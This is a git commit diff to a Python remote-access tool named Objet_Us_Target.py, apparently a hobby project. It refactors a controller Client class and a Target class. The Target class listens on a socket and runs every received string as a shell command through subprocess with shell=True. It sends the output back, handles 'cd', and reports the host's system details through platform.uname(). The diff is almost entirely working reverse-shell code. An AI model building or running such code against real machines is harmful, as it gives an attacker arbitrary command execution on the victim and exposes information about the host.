29c341700e5409b774037c62c7806ad2af7ba87d
Ulysse Wéry <32456856+Gloxx88@users.noreply.github.com>
2018-12-22 18:39:59 +0100

    Update Objet_Us_Target.py

--- Objet_Us_Target.py
+++ Objet_Us_Target.py
@@ -1,7 +1,7 @@
 import socket
 import os
 import subprocess
-
+import platform
 
 class Machine:
     def __init__(self):
@@ -27,28 +27,29 @@ class Client(Machine):
 
     def reverse_shell_send_command(self):
         self.s.send(str.encode("shell"))
+        print("Welcome into the Shell Monitor: \n")
         print("-->", end=" ")
         while True:
             cmd = input("")
-            if cmd == "quit":
-                print("Leaving Shell")
-                input("\n\nPress ENTER")
-                break
             if len(str.encode(cmd)) > 0:
-                self.s.send(str.encode(cmd))
+                self.s.send(str.encode(cmd, "utf-8"))
                 client_response = str(self.s.recv(2048), "utf-8")
                 print(client_response, end="")
+                if cmd == "quit":
+                    break
+
+    def quit(self):
+        self.s.send(str.encode("quit"))
+        response_target = self.s.recv(2048)
+        print(response_target.decode("utf-8"))
+        super().quit()
 
     def getinfo(self):
         self.s.send(str.encode("getinfo"))
-        i = 0
-        while i < 3:
-            info = self.s.recv(2048)
-            if i == 0:
-                print(info.decode("utf-8"))
-            else:
-                print(str(i) + " : " + info.decode("utf-8"))
-            i = i + 1
+        info = self.s.recv(2048)
+        print(info.decode("utf-8"))
+        info = self.s.recv(4096)
+        print(info.decode("utf-8"))
         input("\n\n Press ENTER")
 
 
@@ -60,6 +61,7 @@ class Target(Machine):
         super().__init__()
         self.host = host
         self.port = port
+        self.information = []
 
     # bind de socket with the port
     def socket_bind(self):
@@ -74,55 +76,58 @@ class Target(Machine):
 
     # accept the new co
     def socket_accept(self):
-        global conn
-        conn, address = self.s.accept()
-        print("Connexion has been establish | " + "IP " + address[0] + " | Port : " + str(address[1]))
+        self.s, self.information = self.s.accept()
+        print("Connexion has been establish | " + "IP " + self.information[0] + " | Port : " + str(self.information[1]))
 
 
     def what_to_do(self):
         while True:
-            instruction = conn.recv(2048)
+            instruction = self.s.recv(2048)
             instruction = instruction.decode("utf-8")
             if instruction == "shell":
                 self.reverse_shell_target()
             if instruction == "getinfo":
                 self.getinfo_target()
             if instruction == "quit":
+                self.quit()
                 break
 
     def reverse_shell_target(self):
         while True:
-            data = conn.recv(2048)
+            data = self.s.recv(4096)
             if data.decode("utf-8") == "quit":
+                self.s.send(str.encode("we are leaving"))
                 break
             else:
                 try:
                     if data[:2].decode("utf-8") == 'cd':
                         os.chdir(data[3:].decode("utf-8"))
                     if len(data) > 0:
-                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                         output_bytes = cmd.stdout.read() + cmd.stderr.read()
                         output_str = output_bytes.decode("utf-8", errors='replace')
-                        conn.send(str.encode(output_str + str(os.getcwd()) + "> "))
+                        self.s.send(str.encode(output_str + str(os.getcwd()) + "> "))
                         print(output_str)
                 except OSError as msg:
                     error_msg = "Error OS : " + str(msg)
                     print(error_msg)
-                    conn.send(str.encode(error_msg))
+                    self.s.send(str.encode(error_msg))
 
     # Get information from the target
     def getinfo_target(self):
-        conn.send(str.encode("INFORMATION'S TARGET: \n"))
-        conn.send(str.encode("Computer's name: " + socket.gethostname()))
-        conn.send(str.encode("IP : " + socket.gethostbyname(socket.gethostname())))
+        self.s.send(str.encode("INFORMATION'S TARGET: \n"))
+        self.s.send(str.encode("System: " + platform.uname()[0]
+                               + "\nUser (node): " + platform.uname()[1]
+                               + "\nRelease: " + platform.uname()[2]
+                               + "\nVersion: " + platform.uname()[3]
+                               + "\nMachine: " + platform.uname()[4]
+                               + "\nProcessor: " + platform.uname()[5]))
 
     # close de connection and the socket
     def quit(self):
-        try:
-            conn.close()
-        except socket.error as msg:
-            print("Error conn to close: " + str(msg))
-
+        self.s.send(str.encode("The connection is closing. Say bye to \n\tIP: " + self.information[0]
+                               + " \n\tPort " + str(self.information[1])))
         try:
             super().quit()
         except socket.error as msg:
